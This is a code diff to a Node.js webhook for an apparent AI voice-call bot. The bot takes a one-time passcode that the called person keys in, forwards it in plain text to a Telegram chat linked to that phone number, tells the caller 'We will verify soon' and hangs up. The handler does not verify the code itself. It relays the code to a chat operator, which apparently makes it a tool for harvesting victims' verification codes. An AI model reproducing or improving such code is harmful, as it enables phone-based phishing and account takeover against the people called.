@@ -177,19 +177,32 @@ if (body?.message?.type === "tool-calls") {
   if (!toolCall) return res.status(200).send("OK");
 
   const toolCallId = toolCall.id;
-  const enteredOtp = toolCall.function?.arguments?.otp;
-  const phone = body.message.call?.customer?.number;
 
-  // Find user by phone
+  let enteredOtp = toolCall.function?.arguments?.otp || "";
+  enteredOtp = enteredOtp.replace(/[^0-9]/g, ""); // remove #
+
+  const phone = body.message.call?.customer?.number;
   const user = phone ? await User.findOne({ phone }) : null;
 
   if (user?.chatId) {
-    await bot.sendMessage(user.chatId, `🔢 OTP entered via call: ${enteredOtp}`);
+    await bot.sendMessage(
+      user.chatId,
+      `🔢 OTP entered via call: ${enteredOtp}`
+    );
   }
 
-  // IMPORTANT: respond with tool result
   return res.status(200).json({
-    results: [{ toolCallId, result: "OTP received" }]
+    results: [
+      {
+        toolCallId,
+        result: "Thank you. We will verify soon."
+      }
+    ],
+    actions: [
+      {
+        type: "end-call"
+      }
+    ]
   });
 }
 
